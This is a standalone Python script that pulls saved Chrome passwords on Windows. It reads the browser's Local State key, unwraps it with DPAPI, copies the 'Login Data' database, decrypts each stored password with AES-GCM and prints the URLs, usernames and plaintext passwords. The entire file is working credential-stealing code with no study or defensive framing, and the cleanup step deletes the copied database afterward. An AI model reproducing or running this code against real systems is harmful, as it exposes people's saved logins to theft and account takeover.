import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta
import argparse

def chrome_date_and_time(chrome_data):
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

def fetching_encryption_key():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[0])
        except:
            return "No Passwords"

def fetch_passwords():
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_last_used")

    for row in cursor.fetchall():
        main_url = row[0]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)

        if user_name or decrypted_password:
            print(f"[+] URL: {main_url}")
            print(f"    Username: {user_name}")
            print(f"    Password: {decrypted_password}\n")

    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

def main():
    fetch_passwords()

if __name__ == "__main__":
    main()
